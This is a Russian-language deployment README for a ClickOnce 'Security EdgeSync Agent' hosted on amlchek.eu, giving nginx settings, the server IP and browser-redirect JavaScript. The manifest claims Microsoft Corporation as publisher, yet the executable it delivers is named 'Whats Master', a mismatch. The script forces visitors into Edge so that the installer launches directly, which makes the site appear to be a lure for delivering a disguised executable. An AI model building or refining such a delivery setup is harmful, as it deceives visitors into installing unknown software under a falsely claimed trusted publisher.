# ClickOnce Deployment для amlchek.eu

Полная инструкция по развертыванию ClickOnce приложения Security EdgeSync Agent на домене amlchek.eu.

## 🚀 Быстрый старт

### Опция 1: Полное автоматическое развертывание

```bash
# На сервере с Ubuntu/Debian, от root:
sudo ./deploy-master.sh
```

### Опция 2: Быстрое исправление (если проект уже развернут)

```bash
# В папке проекта:
./quick-fix-clickonce.sh
```

## 📋 Что включено

### 1. ClickOnce Manifest

- **Файл**: `public/deploy/whatsmaster.application`
- **Приложение**: Security EdgeSync Agent v9.1.0
- **Издатель**: Microsoft Corporation
- **Домен**: https://amlchek.eu/deploy/whatsmaster.application

### 2. React Application

- **Главная стра��ица**: Builder.io дизайн
- **Кнопка запуска**: "🚀 Запустить EdgeSync Agent"
- **Функция**: Автоматическая переадресация на Edge + ClickOnce

### 3. Исполняемый файл

- **Файл**: `public/deploy/Whats Master-v9.1.0-win-x64.exe`
- **Размер**: 79,605,750 байт
- **Хеш**: SHA1 для валидации ClickOnce

## 🔧 Техническая конфигурация

### nginx Configuration

```nginx
# ClickOnce MIME типы
location ~* \.application$ {
    add_header Content-Type "application/x-ms-application";
    add_header Cache-Control "no-cache, no-store, must-revalidate";
}

location ~* \.exe$ {
    add_header Content-Type "application/octet-stream";
    add_header Content-Disposition "attachment";
}
```

### JavaScript Browser Detection

```javascript
function startDownload() {
  const clickonceLink = `${baseUrl}/deploy/whatsmaster.application`;
  const browserName = uap.getResult().browser.name;

  if (browserName !== "Edge") {
    window.location.href = `microsoft-edge:${clickonceLink}`;
  } else {
    window.location.href = clickonceLink;
  }
}
```

## 📁 Структура проекта

```
/
├── client/pages/Index.tsx          # React компонент с кнопкой
├── index.html                      # HTML с JS функцией
├── public/deploy/                  # ClickOnce файлы
│   ├── whatsmaster.application     # Манифест развертывания
│   └── Whats Master-v9.1.0-win-x64.exe  # Исполняемый файл
├── deploy-master.sh                # Полный скрипт развертывания
├── quick-fix-clickonce.sh          # Быстрое исправление
└── CLICKONCE-DEPLOY-README.md      # Эта инструкция
```

## 🌐 Домен и DNS

- **Домен**: amlchek.eu
- **IP**: 69.62.126.191
- **SSL**: Let's Encrypt (автоматически)
- **DNS**: A-запись amlchek.eu → 69.62.126.191

## ✅ Проверка работоспособности

### 1. Проверка файлов

```bash
# Манифест доступен
curl -I https://amlchek.eu/deploy/whatsmaster.application

# Правильный MIME тип
# Ответ: Content-Type: application/x-ms-application
```

### 2. Проверка ClickOnce

```bash
# Размер exe файла
ls -la /var/www/html/deploy/*.exe

# Статус nginx
systemctl status nginx
```

### 3. Браузерное тестирование

1. Откройте https://amlchek.eu
2. Нажмите "🚀 Запустить EdgeSync Agent"
3. Браузер должен:
   - Переключиться на Edge (если не Edge)
   - Скачать и запустить ClickOnce приложение
   - Показать диалог установки Security EdgeSync Agent

## 🔍 Устранение неполадок

### Ошибка: "Parsing and DOM creation of the manifest resulted in error"

**Причина**: Неправильная структура XML манифеста
**Решение**:

```bash
./quick-fix-clickonce.sh
```

### Ошибка: "The application could not be downloaded"

**Причина**: Неправильные MIME типы в nginx
**Решение**: Проверить nginx конфигурацию:

```bash
sudo nginx -t
sudo systemctl reload nginx
```

### Ошибка: "File not found" для exe файла

**Причина**: Файл не скопирован или неправильные права
**Решение**:

```bash
sudo cp "public/deploy/Whats Master-v9.1.0-win-x64.exe" /var/www/html/deploy/
sudo chown www-data:www-data "/var/www/html/deploy/Whats Master-v9.1.0-win-x64.exe"
```

## 📊 Мониторинг

После развертывания созда��тся автоматический мониторинг:

### Скрипт мониторинга

```bash
# Запуск проверки
/usr/local/bin/amlchek-monitor.sh

# Логи мониторинга
tail -f /var/log/amlchek-monitor.log
```

### Cron задача

Автоматическая проверка каждые 15 минут:

```bash
# Просмотр cron задач
crontab -l
```

## 🔐 Безопасность

### SSL/TLS

- Автоматический SSL сертификат от Let's Encrypt
- Принудительная переадресация HTTP → HTTPS
- HSTS заголовки

### Firewall

```bash
# Открытые порты
ufw status
# 22/tcp (SSH)
# 80/tcp, 443/tcp (HTTP/HTTPS)
```

### Content Security Policy

```http
Content-Security-Policy: default-src 'self' http: https: data: blob: 'unsafe-inline'
```

## 📝 Команды управления

### Основные команды

```bash
# Перезапуск nginx
sudo systemctl restart nginx

# Проверка логов nginx
sudo tail -f /var/log/nginx/error.log

# Обновление SSL сертификата
sudo certbot renew

# Проверка статуса развертывания
./quick-fix-clickonce.sh
```

### Команды разработки

```bash
# Локальная разработка
npm run dev

# Сборка проекта
npm run build

# Проверка типов
npm run typecheck
```

## 🎯 Финальная проверка

### Чек-лист успешного развертывания:

- [ ] Сайт открывается по https://amlchek.eu
- [ ] Кнопка "🚀 Запустить EdgeSync Agent" видна
- [ ] При клике происходит переадресация на Edge
- [ ] ClickOnce манифест доступен по прямой ссылке
- [ ] MIME тип манифеста: `application/x-ms-application`
- [ ] EXE файл доступен для скачивания
- [ ] SSL сертификат активен
- [ ] nginx работает без ошибок

---

## 🆘 Поддержка

При возникновении проблем:

1. Запустите быстрое исправление: `./quick-fix-clickonce.sh`
2. Проверьте логи: `sudo tail -f /var/log/nginx/error.log`
3. Перезапустите полное развертывание: `sudo ./deploy-master.sh`

**Домен**: amlchek.eu  
**Приложение**: Security EdgeSync Agent v9.1.0  
**Статус**: Готов к производству ✅
